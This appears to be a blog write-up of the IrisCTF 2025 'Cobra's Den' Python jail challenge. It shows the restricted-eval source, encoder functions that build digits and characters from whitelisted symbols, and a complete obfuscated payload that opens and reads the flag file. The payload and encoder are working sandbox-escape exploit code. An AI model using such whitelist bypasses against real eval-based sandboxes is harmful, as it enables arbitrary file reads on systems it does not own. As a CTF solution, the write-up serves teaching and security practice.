+++
title = 'Iris Ctf 2025 Misc Cobras Den'
date = 2025-01-06T00:08:48-05:00
draft = false
+++

Cobra's Den was a python jail escape challenge for IrisCTF 2025.

Lets take a look at the code
```python
# flag stored at 'flag' in current dir
import builtins

all_builtins = dir(builtins)
filtered_builtins = {name: getattr(builtins, name) for name in all_builtins if len(name) <= 4}
filtered_builtins.update({'print': print})

whitelist = "<ph[(cobras.den)]+~"
security_check = lambda s: any(c not in whitelist for c in s) or len(s) > 1115 or s.count('.') > 1

print('Good luck!')
while True:
    cmd = input("Input: ")
    if security_check(cmd):
        print("No dice!")
    else:
        try:
            eval(f"print({cmd})", {"__builtins__": filtered_builtins})
        except SyntaxError as e:
            print(f"Syntax error: {e}")
        except Exception as e:
            print(f"An error occurred: {e}")

```

The whitelist is quite restrictive, we can only use the characters from `<ph[(cobras.den)]+~` and we have to stay under 1115 characters. We are told the flag is located in flag at the current directory and give the characters we have we can call `open()` and `read()`, but encoding flag will be a challenge. Let's see how we can use the characters we are given to encode `flag`

## Getting characters without characters

First, we can do comparisons on empty tuples which gets us `True` and `False`. In python, `True` is equal to 1 and `False` is equal to 0.  Unfortunetly we cannot use the equals sign to do:
```python
>>> ()==()
True
```
But we can use `>` which lets us do:
```python
>>> ()>()
False
```
We can use `~` the bitwise NOT operator to get -1
```python
>>> ~(()>())
-1
```
And since we also can use + we can add -1 to itself to get -2 and bitwise NOT to get 1
```python
>>>~(~(()>())+~(()>()))
1
```
Unfortunetly if we try to build out the digits 1-9 this way, we run into the character limit as the strings get very lengthy. Looking at the built in functions we could use, I saw abs(), and using that we can get 1 by doing:
```python
>>>abs(~(()<()))
1
```

Now we can build out the numbers 1 - 9:

```python

def encode_digit(number: int):
    if number == 0:
        return """()<()"""
    if number == 1:
        return """abs(~(()<()))""" 
    if number == 2:
        return """abs(~(()<())+~(()<()))"""
    if number == 3:
        return """abs(~(()<())+~(()<())+~(()<()))"""
    if number == 4:
        return """abs(~(()<())<<abs(~(()<())+~(()<())))"""
    if number == 5:
        return """abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<()))"""
    if number == 6:
        return """abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))"""
    if number == 7:
        return """abs(~(()<())<<abs(~(()<())+~(()<())+~(()<())))+~(()<())"""
    if number == 8:
        return """abs(~(()<())<<abs(~(()<())+~(()<())+~(()<())))"""
    if number == 9:
        return """abs((~(()<())<<abs(~(()<())+~(()<())+~(()<())))+~(()<()))"""
```

From there we can encode any number:

```python
def encode_number(number: int):
    if number < 10:
        return encode_digit(number)
    shifts = []
    current = number
    shift_val = 0
    while current > 0:
        if current & 1:  
            shifts.append(shift_val)
        current >>= 1  
        shift_val += 1
    txt = ""
    for shift in shifts:
        if txt:
            txt += "+"
        if shift == 0:
            txt += encode_number(1)
        else:
            txt += "(" + encode_number(1) + "<<" + encode_number(shift) + ")"
    return txt
```

And then any text:
```python

def encode_text(text: str):
    result = ""
    for ch in map(ord, text):
        result += "chr(" + encode_number(ch) + ")+"
    result[::-1]
    print(len(result))
    return result
```

Gettin us our final payload just over 850 chars, well under the limit

```python
open(chr((abs(~(()<()))<<abs(~(()<())))+(abs(~(()<()))<<abs(~(()<())+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))))+chr((abs(~(()<()))<<abs(~(()<())+~(()<())))+(abs(~(()<()))<<abs(~(()<())+~(()<())+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))))+chr(abs(~(()<()))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))))+chr(abs(~(()<()))+(abs(~(()<()))<<abs(~(()<())))+(abs(~(()<()))<<abs(~(()<())+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())))+(abs(~(()<()))<<abs((~(()<())<<abs(~(()<())+~(()<())))+~(()<())+~(()<()))))).read()